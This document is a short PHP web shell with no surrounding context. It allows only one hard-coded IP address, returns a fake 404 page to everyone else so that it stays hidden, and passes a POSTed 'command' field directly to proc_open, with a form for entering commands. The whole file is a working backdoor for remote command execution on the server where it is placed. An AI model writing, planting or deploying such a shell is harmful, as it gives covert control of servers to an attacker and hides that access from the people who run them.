<?php
$allowedIPs = array('192.0.2.10');
$allowed = in_array($_SERVER['REMOTE_ADDR'], $allowedIPs);
if (!$allowed) { header('HTTP/1.0 404 Not Found'); die(); }
$command = isset($_POST['command']) ? $_POST['command'] : '';
$p = proc_open($command, array(1 => array('pipe', 'w')), $io);
?>
<form method="post"><input name="command"></form>
